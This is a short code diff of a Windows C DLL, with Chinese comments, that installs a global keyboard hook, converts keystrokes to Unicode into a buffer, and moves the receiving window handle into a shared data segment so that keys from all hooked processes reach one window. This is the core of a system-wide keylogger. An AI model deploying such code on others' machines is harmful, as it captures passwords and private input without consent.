@@ -5,8 +5,13 @@
 // 全局变量
 HINSTANCE g_hInstance = NULL; // DLL 模块句柄
 HHOOK g_hHook = NULL;       // 钩子句柄
-HWND g_hWnd = NULL;         // 用于发送消息的窗口句柄
 TCHAR g_szBuffer[256] = { 0 }; // 用于存储键盘输入的缓冲区
+
+#pragma data_seg("Shared")
+    HWND g_hWnd = NULL;         // 用于发送消息的窗口句柄
+#pragma data_seg()
+
+#pragma comment(linker, "/SECTION:Shared,RWS")
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -81,7 +86,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         //  GetKeyState函数获取Shift按键的状态然后赋值给 bKeyState[VK_SHIFT]。
         bKeyState[VK_SHIFT] = HIBYTE(GetKeyState(VK_SHIFT));
 		// 将虚拟键代码转换为 unicode 字符
-        ToUnicode((UINT)wParam,         // 虚拟键代码
+        ToUnicode(wParam,         // 虚拟键代码
                     lParam >> 16, // 扫描码
                     bKeyState,             // 键盘状态数组
                     g_szBuffer,           // 存储转换结果的缓冲区
